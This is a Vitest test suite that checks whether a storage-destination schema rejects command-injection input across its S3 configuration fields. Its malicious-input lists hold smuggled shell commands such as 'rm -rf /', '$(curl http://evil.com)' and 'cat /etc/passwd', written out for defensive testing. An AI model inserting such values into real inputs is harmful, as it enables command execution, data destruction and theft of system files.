import { describe, expect, test } from "vitest";
import { z } from "zod";
import { apiCreateDestination } from "@/server/db/schema";

// Test suite for command injection protection in destination router
describe("Destination Input Validation - Command Injection Protection", () => {
	// Valid test data that should pass validation
	const validDestinationData = {
		name: "Test Destination",
		provider: "AWS",
		accessKey: "AKIAIOSFODNN7EXAMPLE",
		secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		bucket: "my-test-bucket",
		region: "us-east-1",
		endpoint: "https://s3.amazonaws.com",
	};

	describe("Provider field validation", () => {
		test("should accept valid provider names", () => {
			const valid = ["AWS", "aws", "AWS-S3", "aws_s3", "S3-Compatible"];
			for (const provider of valid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					provider,
				});
				expect(result.success).toBe(true);
			}
		});

		test("should reject provider with shell metacharacters", () => {
			const malicious = [
				"AWS; rm -rf /",
				"AWS$(whoami)",
				"AWS`whoami`",
				"AWS|ls",
				"AWS&whoami",
				"AWS\nwhoami",
				"AWS||whoami",
				"AWS&&whoami",
				"AWS>test.txt",
				"AWS<test.txt",
				"AWS'injection'",
				'AWS"injection"',
				"AWS\\injection",
				"AWS$(curl http://evil.com)",
			];

			for (const provider of malicious) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					provider,
				});
				expect(result.success).toBe(false);
				if (!result.success) {
					expect(result.error.issues[0].message).toContain(
						"Provider must contain only alphanumeric characters",
					);
				}
			}
		});

		test("should reject provider exceeding max length", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				provider: "a".repeat(51),
			});
			expect(result.success).toBe(false);
		});
	});

	describe("Access Key field validation", () => {
		test("should accept valid access keys", () => {
			const valid = [
				"AKIAIOSFODNN7EXAMPLE",
				"AKIA1234567890ABCDEF",
				"base64+encoded/key==",
			];
			for (const accessKey of valid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					accessKey,
				});
				expect(result.success).toBe(true);
			}
		});

		test("should reject access key with shell metacharacters", () => {
			const malicious = [
				"KEY; rm -rf /",
				"KEY$(whoami)",
				"KEY`whoami`",
				"KEY|ls",
				"KEY&whoami",
				"KEY\nwhoami",
				"KEY'injection'",
				'KEY"injection"',
				"KEY\\injection",
			];

			for (const accessKey of malicious) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					accessKey,
				});
				expect(result.success).toBe(false);
				if (!result.success) {
					expect(result.error.issues[0].message).toContain(
						"Access key contains invalid characters",
					);
				}
			}
		});

		test("should reject access key exceeding max length", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				accessKey: "A".repeat(201),
			});
			expect(result.success).toBe(false);
		});
	});

	describe("Secret Access Key field validation", () => {
		test("should accept valid secret access keys", () => {
			const valid = [
				"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
				"base64+encoded/key==",
				"1234567890abcdefghij",
			];
			for (const secretAccessKey of valid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					secretAccessKey,
				});
				expect(result.success).toBe(true);
			}
		});

		test("should reject secret access key with shell metacharacters", () => {
			const malicious = [
				"SECRET; rm -rf /",
				"SECRET$(whoami)",
				"SECRET`whoami`",
				"SECRET|ls",
				"SECRET&whoami",
				"SECRET\nwhoami",
				"SECRET'injection'",
				'SECRET"injection"',
				"SECRET\\injection",
			];

			for (const secretAccessKey of malicious) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					secretAccessKey,
				});
				expect(result.success).toBe(false);
				if (!result.success) {
					expect(result.error.issues[0].message).toContain(
						"Secret access key contains invalid characters",
					);
				}
			}
		});

		test("should reject secret access key exceeding max length", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				secretAccessKey: "A".repeat(201),
			});
			expect(result.success).toBe(false);
		});
	});

	describe("Bucket field validation", () => {
		test("should accept valid bucket names", () => {
			const valid = [
				"my-bucket",
				"my.bucket",
				"my_bucket",
				"mybucket123",
				"my-bucket.backup",
			];
			for (const bucket of valid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					bucket,
				});
				expect(result.success).toBe(true);
			}
		});

		test("should reject bucket with shell metacharacters", () => {
			const malicious = [
				"bucket; rm -rf /",
				"bucket$(whoami)",
				"bucket`whoami`",
				"bucket|ls",
				"bucket&whoami",
				"bucket\nwhoami",
				"bucket'injection'",
				'bucket"injection"',
				"bucket\\injection",
				"bucket>test.txt",
				"bucket<test.txt",
			];

			for (const bucket of malicious) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					bucket,
				});
				expect(result.success).toBe(false);
				if (!result.success) {
					expect(result.error.issues[0].message).toContain(
						"Bucket name contains invalid characters",
					);
				}
			}
		});

		test("should reject empty bucket name", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				bucket: "",
			});
			expect(result.success).toBe(false);
		});

		test("should reject bucket exceeding max length (63 chars)", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				bucket: "a".repeat(64),
			});
			expect(result.success).toBe(false);
		});
	});

	describe("Region field validation", () => {
		test("should accept valid region names", () => {
			const valid = [
				"us-east-1",
				"us-west-2",
				"eu-west-1",
				"ap-south-1",
				"custom_region",
			];
			for (const region of valid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					region,
				});
				expect(result.success).toBe(true);
			}
		});

		test("should reject region with shell metacharacters", () => {
			const malicious = [
				"us-east-1; rm -rf /",
				"us-east-1$(whoami)",
				"us-east-1`whoami`",
				"us-east-1|ls",
				"us-east-1&whoami",
				"us-east-1\nwhoami",
				"us-east-1'injection'",
				'us-east-1"injection"',
				"us-east-1\\injection",
			];

			for (const region of malicious) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					region,
				});
				expect(result.success).toBe(false);
				if (!result.success) {
					expect(result.error.issues[0].message).toContain(
						"Region must contain only alphanumeric characters",
					);
				}
			}
		});

		test("should reject region exceeding max length", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				region: "a".repeat(51),
			});
			expect(result.success).toBe(false);
		});
	});

	describe("Endpoint field validation", () => {
		test("should accept valid endpoint URLs", () => {
			const valid = [
				"https://s3.amazonaws.com",
				"https://s3.us-east-1.amazonaws.com",
				"https://custom-s3.example.com:9000",
				"http://localhost:9000",
			];
			for (const endpoint of valid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					endpoint,
				});
				expect(result.success).toBe(true);
			}
		});

		test("should reject invalid endpoint URLs", () => {
			const invalid = [
				"not-a-url",
				"ftp://invalid-protocol.com",
				"; rm -rf /",
				"$(whoami)",
				"`whoami`",
			];

			for (const endpoint of invalid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					endpoint,
				});
				expect(result.success).toBe(false);
				if (!result.success) {
					expect(result.error.issues[0].message).toContain("Invalid endpoint");
				}
			}
		});

		test("should reject endpoint exceeding max length", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				endpoint: "https://" + "a".repeat(200) + ".com",
			});
			expect(result.success).toBe(false);
		});
	});

	describe("Server ID field validation", () => {
		test("should accept valid server IDs", () => {
			const valid = ["server123", "server-123", "server_123", "ABC123"];
			for (const serverId of valid) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					serverId,
				});
				expect(result.success).toBe(true);
			}
		});

		test("should reject server ID with shell metacharacters", () => {
			const malicious = [
				"server; rm -rf /",
				"server$(whoami)",
				"server`whoami`",
				"server|ls",
				"server&whoami",
				"server\nwhoami",
				"server'injection'",
				'server"injection"',
				"server\\injection",
			];

			for (const serverId of malicious) {
				const result = apiCreateDestination.safeParse({
					...validDestinationData,
					serverId,
				});
				expect(result.success).toBe(false);
				if (!result.success) {
					expect(result.error.issues[0].message).toContain(
						"Server ID contains invalid characters",
					);
				}
			}
		});

		test("should accept undefined server ID", () => {
			const result = apiCreateDestination.safeParse(validDestinationData);
			expect(result.success).toBe(true);
		});

		test("should reject server ID exceeding max length", () => {
			const result = apiCreateDestination.safeParse({
				...validDestinationData,
				serverId: "a".repeat(51),
			});
			expect(result.success).toBe(false);
		});
	});

	describe("Combined malicious input tests", () => {
		test("should reject multiple fields with injection attempts", () => {
			const result = apiCreateDestination.safeParse({
				name: "Test",
				provider: "AWS; whoami",
				accessKey: "KEY$(curl evil.com)",
				secretAccessKey: "SECRET`cat /etc/passwd`",
				bucket: "bucket|ls",
				region: "us-east-1\nrm -rf /",
				endpoint: "https://evil.com/$(whoami)",
				serverId: "server&malicious",
			});

			expect(result.success).toBe(false);
		});
	});

	describe("Positive tests - Legitimate S3 configurations", () => {
		test("should accept AWS S3 configuration", () => {
			const awsConfig = {
				name: "AWS Production Backup",
				provider: "AWS",
				accessKey: "AKIAIOSFODNN7EXAMPLE",
				secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
				bucket: "my-production-backups",
				region: "us-east-1",
				endpoint: "https://s3.amazonaws.com",
			};

			const result = apiCreateDestination.safeParse(awsConfig);
			expect(result.success).toBe(true);
		});

		test("should accept MinIO configuration", () => {
			const minioConfig = {
				name: "MinIO Local",
				provider: "Minio",
				accessKey: "minioadmin",
				secretAccessKey: "minioadmin123",
				bucket: "backups",
				region: "us-east-1",
				endpoint: "http://localhost:9000",
			};

			const result = apiCreateDestination.safeParse(minioConfig);
			expect(result.success).toBe(true);
		});

		test("should accept DigitalOcean Spaces configuration", () => {
			const spacesConfig = {
				name: "DigitalOcean Spaces",
				provider: "DigitalOcean",
				accessKey: "DO001234567890EXAMPLE",
				secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
				bucket: "my-spaces-bucket",
				region: "nyc3",
				endpoint: "https://nyc3.digitaloceanspaces.com",
			};

			const result = apiCreateDestination.safeParse(spacesConfig);
			expect(result.success).toBe(true);
		});

		test("should accept configuration with server ID", () => {
			const configWithServer = {
				...validDestinationData,
				serverId: "server-abc123",
			};

			const result = apiCreateDestination.safeParse(configWithServer);
			expect(result.success).toBe(true);
		});
	});
});
